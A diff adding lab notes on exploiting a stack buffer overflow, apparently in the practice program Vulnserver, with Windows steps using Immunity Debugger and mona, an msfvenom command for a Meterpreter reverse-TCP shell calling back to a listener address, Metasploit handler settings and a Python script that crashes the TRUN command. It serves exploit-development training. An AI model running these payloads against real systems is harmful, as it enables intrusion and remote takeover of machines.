@@ -262,6 +262,32 @@ file
 - set the eip as the converted bytes
 - ensure nop sled is set to ```"\x90" * 15```. the number can be between 10 and 20
 - place code from msfconsole below for shell
+### Steps for windows
+- launch Immunity Debugger with admin
+- check strings of vuln program
+- run vuln program
+- run ```netstat -anop tcp``` in powershell
+- run ```get-process``` in powershell to view more information
+- begin analysis with immunity debugger
+- determine successfull interaction with the program and port
+- successfully break the program
+- utilize wiremask online tool to find offset
+- verify offset
+- search for first address ```!mona jmp -r ESP -m "essfunc.dll" ```. Check in the log window
+- convert indian of bytes and ensure caps did not change
+- create shellcode ```msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.229 lport=5555 -b "\x00" -f python```.
+- utilize msfconsole
+- multi/handler ```use multi/hander```
+- set the payload to the same as your reverse payload. ```set payload windows/meterpreter/reverse_tcp```
+- set the lport to what you set in the msfvenom reverse payload. ```set lport 5555```
+- set the lhost to the box that you want to reverse to. ```set lhost 0.0.0.0```
+- run exploit to start the listener
+- run the script to exploit the machine
+- 
+
+
+
+
 
 
 ### Example of script
@@ -328,14 +354,34 @@ msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
 ```
 ### Windows
 - run immunity debugger as admin
+- run msfvenom from lin-ops
 ```
 netstat -anop tcp
+!mona jmp -r ESP -m "essfunc.dll"                                        # log data window
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.229 lport=5555 -b "\x00" -f python
 
 
 ```
 ### Script example
+```
+#!/usr/bin/env python
 
+import socket
 
+buf = "TRUN /.:/"
+buf += "A" * 5000
+
+s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
+s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
+print s.recv(1024) ## Print to screen what we recieve
+s.send(buf) ## Send our buf variable
+print s.recv(1024) ## Print to screen what we recieve
+s.close() ## Close the socket
+```
+```
+
+```
 
 
 
